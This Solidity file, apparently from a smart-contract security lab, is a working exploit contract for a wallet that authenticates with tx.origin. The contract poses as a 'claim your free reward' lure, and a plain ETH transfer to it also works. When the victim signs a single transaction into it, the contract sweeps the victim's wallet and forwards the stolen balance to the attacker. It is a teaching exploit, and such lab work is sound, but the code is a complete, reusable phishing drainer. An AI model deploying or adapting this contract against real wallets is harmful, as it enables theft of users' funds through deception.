// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {TxOriginWallet} from "../vulnerable/TxOriginWallet.sol";

/// @title TxOriginAttacker
/// @notice Exploit for TxOriginWallet (SWC-115 / CWE-287). EtherShield lab,
///         local chain and fake funds only.
/// @dev THE MECHANISM, and how it differs from the first two exploits:
///
///      - Vuln 1 (reentrancy) needed a callback and a loop.
///      - Vuln 2 (access control) needed nothing at all: the attacker walked in
///        alone, because one modifier was missing.
///      - This one CANNOT be run alone. Every function below reverts if the
///        attacker calls it himself, because the wallet's guard really does
///        reject strangers. The exploit needs the victim to sign ONE
///        transaction into this contract - any transaction. The attacker
///        supplies the code; the victim unknowingly supplies the authority.
///
///      That is what `tx.origin` authentication buys you: the guard is not
///      absent, it is answering the wrong question. `tx.origin` is whoever
///      signed the transaction, so while the victim is anywhere in the call
///      stack, this contract passes a check that was meant to mean "the owner
///      is calling me".
///
///      This contract is disguised as a reward claim - the kind of lure the
///      victim is told to interact with. Nothing about the lure matters; it
///      only has to get the victim to send one transaction here. `receive()`
///      proves even that is more than needed: a plain ETH transfer to this
///      address runs the same attack.
contract TxOriginAttacker {
    /// @notice The wallet being drained.
    TxOriginWallet public immutable wallet;
    /// @notice The attacker's EOA - the only address allowed to collect the loot.
    address public immutable owner;

    /// @notice Set once the wallet has been swept. Instrumentation for the tests.
    bool public hijacked;
    /// @notice How much the sweep took, recorded before the transfer.
    uint256 public stolen;
    /// @notice How many times the lure was taken. Shows the attack needs exactly one.
    uint256 public lureCount;

    event LureTaken(address indexed victim, uint256 count);
    event Hijacked(address indexed victim, uint256 amount);
    event Collected(address indexed to, uint256 amount);

    error NotOwner();
    error PayoutFailed();

    constructor(TxOriginWallet _wallet) {
        wallet = _wallet;
        owner = msg.sender;
    }

    /// @notice The lure. Looks like "claim your free reward"; actually sweeps
    ///         the caller's wallet. The victim signs this call themselves.
    function claimReward() external {
        _hijack();
    }

    /// @notice The drive-by variant: the victim only has to SEND ETH here - a
    ///         donation, a tip, a mistyped transfer - and the attack still runs.
    /// @dev The wallet's own sweep pays into this function too, so inbound ETH
    ///      from the wallet must not re-enter the attack.
    receive() external payable {
        if (msg.sender != address(wallet)) {
            _hijack();
        }
    }

    /// @notice Hijack `transferTo` instead of `sweep` - the other function the
    ///         broken modifier guards. Proves the finding is the modifier, not
    ///         one careless function.
    function tryTransfer(uint256 amount) external {
        wallet.transferTo(address(this), amount);
    }

    /// @notice Attempt the same hijack against `setRecoveryAddress`, which
    ///         checks `msg.sender` inline. Expected to REVERT: this contract is
    ///         the caller, and it is not the owner. Left unguarded on purpose so
    ///         the revert reaches the test.
    function tryHijackRecovery() external {
        wallet.setRecoveryAddress(address(this));
    }

    /// @notice Same attempt against `recoverOwnership`, also `msg.sender`-checked.
    ///         Expected to REVERT.
    function tryRecoverOwnership() external {
        wallet.recoverOwnership();
    }

    /// @dev The attack itself. Reads the wallet's balance for the record, then
    ///      sweeps it. State is written BEFORE the external call (the CEI habit
    ///      from vuln 1), so the inbound ETH cannot re-enter this.
    function _hijack() private {
        lureCount += 1;
        emit LureTaken(tx.origin, lureCount);

        // The victim is the transaction's origin right now, so the wallet's
        // `onlyOwner` modifier waves this call through. One call, whole balance.
        uint256 amount = wallet.balance();
        stolen += amount;
        hijacked = true;
        emit Hijacked(tx.origin, amount);
        wallet.sweep(address(this));
    }

    /// @notice Forward the stolen ETH to the attacker's EOA.
    /// @dev Note the irony: this guard uses `msg.sender`, because the attacker
    ///      cannot afford the bug he just exploited.
    function collect() external {
        if (msg.sender != owner) revert NotOwner();
        uint256 amount = address(this).balance;
        emit Collected(owner, amount);
        (bool ok,) = owner.call{value: amount}("");
        if (!ok) revert PayoutFailed();
    }

    /// @notice ETH currently held by this exploit contract.
    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
